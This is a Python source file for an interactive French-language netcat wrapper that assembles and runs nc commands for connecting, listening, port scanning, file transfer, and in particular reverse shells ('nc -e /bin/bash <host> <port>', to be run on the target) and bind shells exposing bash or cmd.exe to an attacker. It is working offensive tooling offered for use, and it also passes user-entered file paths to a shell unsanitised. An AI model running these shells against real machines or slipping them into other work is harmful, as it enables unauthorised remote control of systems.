import os
import sys
import subprocess
from colorama import Fore, init

init(autoreset=True)

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    print(Fore.GREEN + r"""
	    ▗     ▗                          
	▛▌█▌▜▘▛▘▀▌▜▘                         
	▌▌▙▖▐▖▙▖█▌▐▖                         
	                                     
              ▌   ▜ ▘  ▗     ▜ ▌     
              ▙▘▀▌▐ ▌  ▜▘▛▌▛▌▐ ▛▌▛▌▚▘
              ▛▖█▌▐▖▌  ▐▖▙▌▙▌▐▖▙▌▙▌▞▖
                                     
	▄▖▖▖▄▖▖▖▄▖                           
	▌ ▙▌▛▌▙▌▌                            
	▙▖ ▌█▌ ▌▙▖
    """)
    print(Fore.RED + "           NETCAT AUTOMATION TOOL  |  by C404C")
    print(Fore.RED + "              https://github.com/Charl-23\n")
    print(Fore.GREEN + "  " + "─" * 56 + "\n")

def section(title):
    print(Fore.GREEN + f"\n  ╔══ {title} " + "═" * (46 - len(title)) + "╗")

def line(text):
    print(Fore.WHITE + f"  ║  {text}")

def sep():
    print(Fore.GREEN + "  ╚" + "═" * 55)

def ask(question, default=None):
    suffix = Fore.WHITE + f" [{default}]" if default else ""
    return input(Fore.GREEN + f"  [?] {question}{suffix} : " + Fore.WHITE).strip()

def ask_yn(question):
    r = input(Fore.GREEN + f"  [?] {question} " + Fore.WHITE + "(o/n) : ").strip().lower()
    return r in ("o", "oui", "y", "yes")

def ask_required(question):
    while True:
        val = input(Fore.GREEN + f"  [?] {question} : " + Fore.WHITE).strip()
        if val:
            return val
        print(Fore.RED + "  [-] Ce champ est obligatoire.")

def ask_int(question, min_val=None, max_val=None):
    while True:
        val = input(Fore.GREEN + f"  [?] {question} : " + Fore.WHITE).strip()
        if not val.isdigit():
            print(Fore.RED + "  [-] Entrez un nombre entier valide.")
            continue
        n = int(val)
        if min_val is not None and n < min_val:
            print(Fore.RED + f"  [-] Valeur minimale : {min_val}")
            continue
        if max_val is not None and n > max_val:
            print(Fore.RED + f"  [-] Valeur maximale : {max_val}")
            continue
        return val

def get_mode():
    section("1/4 — MODE PRINCIPAL")
    line("[1]  Connexion sortante  — Se connecter à un hôte distant")
    line("                          nc <host> <port>")
    line("[2]  Écoute entrante     — Attendre une connexion  (listener)")
    line("                          nc -l -p <port>")
    line("[3]  Scan de ports       — Tester si des ports sont ouverts")
    line("                          nc -z <host> <ports>")
    line("[4]  Reverse shell       — Envoyer un shell vers un listener")
    line("                          nc -e /bin/bash <host> <port>")
    line("[5]  Bind shell          — Ouvrir un shell en écoute locale")
    line("                          nc -l -p <port> -e /bin/bash")
    line("[6]  Transfert de fichier— Envoyer ou recevoir un fichier")
    sep()
    while True:
        choice = ask("Votre choix (1-6)")
        if choice in [str(i) for i in range(1, 7)]:
            return choice
        print(Fore.RED + "  [-] Choix invalide.")

def get_connect():
    section("2/4 — CONNEXION SORTANTE")
    flags = []

    host = ask_required("Hôte cible (IP ou domaine)")
    port = ask_required("Port cible (ex: 4444 ou 20-80 pour une plage)")

    if ask_yn("Mode UDP (-u)  [défaut: TCP]"):
        flags.append("-u")

    if ask_yn("Timeout de connexion (-w)  [secondes]"):
        w = ask_int("Timeout en secondes", min_val=1)
        flags += ["-w", w]

    if ask_yn("Pas de résolution DNS (-n)  [IPs uniquement]"):
        flags.append("-n")

    if ask_yn("Verbose (-v)"):
        flags.append("-v")

    return flags, host, port

def get_listen():
    section("2/4 — MODE ÉCOUTE (LISTENER)")
    flags = ["-l"]

    port = ask_int("Port d'écoute (-p)  (ex: 4444)", min_val=1, max_val=65535)
    flags += ["-p", port]

    if ask_yn("Garder la connexion ouverte (-k)  [keepalive]"):
        flags.append("-k")

    if ask_yn("Mode UDP (-u)  [défaut: TCP]"):
        flags.append("-u")

    if ask_yn("Verbose (-v)"):
        flags.append("-v")

    return flags, "", ""

def get_portscan():
    section("2/4 — SCAN DE PORTS")
    line("Mode zero-I/O : teste si les ports sont ouverts sans envoyer de données.")
    line("Ex port : 80  |  20-80  |  22 80 443")
    sep()
    flags = ["-z"]

    host = ask_required("Hôte cible")
    port = ask_required("Port(s) (ex: 80 ou 20-80)")

    if ask_yn("Mode UDP (-u)  [défaut: TCP]"):
        flags.append("-u")

    if ask_yn("Randomiser l'ordre des ports (-r)"):
        flags.append("-r")

    if ask_yn("Délai entre chaque port (-i)  [secondes]"):
        i = ask_int("Délai en secondes", min_val=1)
        flags += ["-i", i]

    if ask_yn("Timeout (-w)  [secondes]"):
        w = ask_int("Timeout", min_val=1)
        flags += ["-w", w]

    if ask_yn("Pas de résolution DNS (-n)"):
        flags.append("-n")

    flags.append("-v")
    return flags, host, port

def get_reverse_shell():
    section("2/4 — REVERSE SHELL")
    print(Fore.RED + "  ⚠  La machine cible se connecte vers ton listener et t'envoie un shell.\n")
    line("Étape 1 : Lance un listener sur ta machine (ex: nc -l -p 4444)")
    line("Étape 2 : Exécute ce script sur la cible pour qu'elle se connecte vers toi")
    sep()
    flags = []

    host = ask_required("Ton IP (celle qui écoute)  (ex: 10.10.14.5)")
    port = ask_int("Ton port d'écoute (ex: 4444)", min_val=1, max_val=65535)

    print(Fore.GREEN + "\n  [?] Shell à envoyer :")
    print(Fore.WHITE + "      [1] /bin/bash   (Linux)")
    print(Fore.WHITE + "      [2] /bin/sh     (Linux / Unix)")
    print(Fore.WHITE + "      [3] cmd.exe     (Windows)")
    print(Fore.WHITE + "      [4] Personnalisé")
    while True:
        sc = ask("Votre choix")
        if sc == "1":   shell = "/bin/bash"; break
        elif sc == "2": shell = "/bin/sh";   break
        elif sc == "3": shell = "cmd.exe";   break
        elif sc == "4":
            shell = ask_required("Chemin du shell")
            break
        print(Fore.RED + "  [-] Choix invalide.")

    flags += ["-e", shell]

    if ask_yn("Verbose (-v)"):
        flags.append("-v")

    return flags, host, port

def get_bind_shell():
    section("2/4 — BIND SHELL")
    print(Fore.RED + "  ⚠  Ouvre un shell en écoute sur la machine locale.\n")
    line("L'attaquant se connecte ensuite sur le port défini pour obtenir le shell.")
    sep()
    flags = ["-l"]

    port = ask_int("Port d'écoute (-p)  (ex: 4444)", min_val=1, max_val=65535)
    flags += ["-p", port]

    print(Fore.GREEN + "\n  [?] Shell à exposer :")
    print(Fore.WHITE + "      [1] /bin/bash")
    print(Fore.WHITE + "      [2] /bin/sh")
    print(Fore.WHITE + "      [3] cmd.exe")
    print(Fore.WHITE + "      [4] Personnalisé")
    while True:
        sc = ask("Votre choix")
        if sc == "1":   shell = "/bin/bash"; break
        elif sc == "2": shell = "/bin/sh";   break
        elif sc == "3": shell = "cmd.exe";   break
        elif sc == "4":
            shell = ask_required("Chemin du shell")
            break
        print(Fore.RED + "  [-] Choix invalide.")

    flags += ["-e", shell]

    if ask_yn("Keepalive (-k)  [accepter plusieurs connexions]"):
        flags.append("-k")

    if ask_yn("Verbose (-v)"):
        flags.append("-v")

    return flags, "", ""

def get_file_transfer():
    section("2/4 — TRANSFERT DE FICHIER")
    line("[1]  Envoyer un fichier    (côté expéditeur)")
    line("[2]  Recevoir un fichier   (côté récepteur / listener)")
    sep()
    while True:
        role = ask("Votre rôle (1/2)")
        if role in ("1", "2"):
            break
        print(Fore.RED + "  [-] Choix invalide.")

    flags = []
    shell_cmd = ""

    if role == "1":
        host = ask_required("IP du récepteur")
        port = ask_int("Port du récepteur (ex: 4444)", min_val=1, max_val=65535)
        filepath = ask_required("Chemin du fichier à envoyer (ex: /root/file.txt)")
        if ask_yn("Verbose (-v)"):
            flags.append("-v")
        shell_cmd = f"< {filepath}"
        return flags, host, port, shell_cmd

    else:
        port = ask_int("Port d'écoute (-p)  (ex: 4444)", min_val=1, max_val=65535)
        flags += ["-l", "-p", port]
        savepath = ask_required("Chemin où sauvegarder le fichier (ex: /root/received.txt)")
        if ask_yn("Verbose (-v)"):
            flags.append("-v")
        shell_cmd = f"> {savepath}"
        return flags, "", "", shell_cmd

def get_common(mode):
    section("3/4 — OPTIONS SUPPLÉMENTAIRES")
    flags = []

    if mode not in ("4", "5", "6"):
        if ask_yn("Dump hexadécimal du trafic dans un fichier (-o)"):
            f = ask_required("Chemin du fichier de dump (ex: /root/traffic.hex)")
            flags += ["-o", f]

        if ask_yn("Envoyer CRLF comme fin de ligne (-C)  [compatibilité Windows]"):
            flags.append("-C")

        if ask_yn("Répondre aux négociations TELNET (-t)"):
            flags.append("-t")

        if ask_yn("IP source locale spécifique (-s)"):
            addr = ask_required("Adresse source locale (ex: 192.168.1.5)")
            flags += ["-s", addr]

        if ask_yn("Autoriser les broadcasts (-b)"):
            flags.append("-b")

    return flags

def get_info(mode):
    section("4/4 — INFORMATION")
    mode_labels = {
        "1": "Connexion sortante",
        "2": "Écoute (Listener)",
        "3": "Scan de ports",
        "4": "Reverse Shell",
        "5": "Bind Shell",
        "6": "Transfert de fichier",
    }
    print(Fore.WHITE + f"  ║  Mode sélectionné : " + Fore.GREEN + mode_labels.get(mode, "?"))
    sep()

def main():
    clear()
    banner()

    mode = get_mode()

    shell_redirect = ""
    host = ""
    port = ""

    if mode == "1":
        mode_flags, host, port = get_connect()
    elif mode == "2":
        mode_flags, host, port = get_listen()
    elif mode == "3":
        mode_flags, host, port = get_portscan()
    elif mode == "4":
        mode_flags, host, port = get_reverse_shell()
    elif mode == "5":
        mode_flags, host, port = get_bind_shell()
    elif mode == "6":
        result = get_file_transfer()
        mode_flags, host, port, shell_redirect = result

    common_flags = get_common(mode)
    get_info(mode)

    cmd = ["nc"]
    cmd += mode_flags
    cmd += common_flags
    if host:
        cmd.append(str(host))
    if port:
        cmd.append(str(port))

    cmd_str = " ".join(cmd)
    if shell_redirect:
        cmd_str += " " + shell_redirect

    mode_labels = {
        "1": "Connexion sortante",
        "2": "Écoute (Listener)",
        "3": "Scan de ports",
        "4": "Reverse Shell",
        "5": "Bind Shell",
        "6": "Transfert de fichier",
    }
    print(Fore.RED + "\n  ╔══ CONFIGURATION FINALE " + "═" * 31 + "╗")
    print(Fore.RED + "  ║  Mode     : " + Fore.WHITE + mode_labels.get(mode, "?"))
    print(Fore.RED + "  ║  Hôte     : " + Fore.WHITE + (str(host) or "local"))
    print(Fore.RED + "  ║  Port     : " + Fore.WHITE + (str(port) or "—"))
    print(Fore.RED + "  ║  Options  : " + Fore.WHITE + f"{' '.join(mode_flags + common_flags)}")
    print(Fore.RED + "  ╚" + "═" * 55)

    print(Fore.GREEN + f"\n  [+] Commande : " + Fore.WHITE + cmd_str + "\n")

    confirm = input(Fore.GREEN + "  [?] Lancer netcat ? (o/n) : ").strip().lower()
    if confirm not in ("o", "oui", "y", "yes"):
        print(Fore.GREEN + "\n  [-] Annulé.")
        sys.exit(0)

    print(Fore.GREEN + "\n  " + "─" * 56 + "\n")

    try:
        if shell_redirect:
            subprocess.run(cmd_str, shell=True, check=False)
        else:
            subprocess.run(cmd, check=False)
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n  [!] Interrompu par l'utilisateur.")
    except FileNotFoundError:
        print(Fore.RED + "  [-] Netcat introuvable. Est-il installé et dans le PATH ?")

if __name__ == "__main__":
    main()
